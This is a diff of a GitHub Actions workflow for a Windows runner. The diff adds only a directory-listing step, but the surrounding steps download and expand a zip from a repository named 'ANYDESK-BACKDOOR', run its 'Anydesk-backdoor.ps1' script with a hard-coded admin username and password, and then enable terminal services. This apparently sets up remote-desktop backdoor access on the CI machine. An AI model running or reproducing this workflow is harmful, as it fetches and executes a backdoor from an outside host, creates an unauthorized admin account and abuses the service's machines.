@@ -8,6 +8,8 @@ jobs:
       run: Invoke-WebRequest -Uri 'https://github.com/MrAli-Code/ANYDESK-BACKDOOR/archive/refs/heads/main.zip' -OutFile 'C:\users\runneradmin\downloads\ANYDESK-BACKDOOR-main.zip'
     - name: Expanding Backdoor
       run: Expand-Archive C:\users\runneradmin\downloads\ANYDESK-BACKDOOR-main.zip
+    - name: DIR
+      run: DIR
     - name: Auth
       run: powershell -File C:\users\runneradmin\Downloads\ANYDESK-BACKDOOR-main\Anydesk-backdoor.ps1 -InstallPath "C:\CustomPath" -AdminUsername "Kopp56" -AdminPassword "Senha@123"
     - name: Enable TS
